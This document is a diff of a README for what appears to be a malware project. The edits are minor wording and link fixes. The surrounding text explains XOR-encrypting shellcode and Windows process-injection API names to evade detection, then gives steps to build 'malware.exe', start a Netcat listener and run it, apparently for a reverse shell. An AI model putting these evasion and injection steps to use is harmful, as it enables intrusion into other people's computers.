@@ -17,7 +17,7 @@ python xorencrypt.py shellcode.bin
 ```
 
 ##### All Functions Must Be Encrypted
-Make sure every functions like a `CreateRemoteThread`, `WriteProcessMemory`, and `VirtualAllocEx` are encrypted. Use the Python to do.
+Make sure every function, like `CreateRemoteThread`, `WriteProcessMemory`, and `VirtualAllocEx` is encrypted. Use Python to do.
 ```sh
 ptyhon
 printCiphertext(xor("VirtualAllocEx", "password"))
@@ -28,7 +28,7 @@ printCiphertext(xor("CreateRemoteThread", "password"))
 
 ### Execute
 1. Run `compiler.bat` to compile all of them, then you will have `malware.exe`
-2. Run the listener (such as [Netcat] (https://github.com/diegocr/netcat/) tool)
+2. Run the listener (such as [Netcat](https://github.com/diegocr/netcat/) tool)
 3. Run `malware.exe`
 
-***All stuffs are only for education purpose!***
+***Everything is strictly for educational purposes!***
